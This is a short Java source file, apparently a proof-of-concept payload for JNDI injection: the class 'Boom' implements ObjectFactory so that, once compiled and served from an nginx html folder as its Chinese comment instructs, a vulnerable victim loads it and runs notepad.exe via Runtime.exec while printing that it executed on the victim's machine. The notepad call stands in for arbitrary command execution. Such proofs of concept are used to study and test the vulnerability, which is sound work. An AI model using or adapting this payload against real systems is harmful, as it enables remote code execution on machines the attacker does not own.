import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

/**
 * 这个类编译好以后放到nginx html文件夹下
 */
public class Boom implements ObjectFactory {
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        System.out.println("我是Boom，我在你本地执行了！！！");
        Runtime.getRuntime().exec("notepad.exe");
        return null;
    }
}
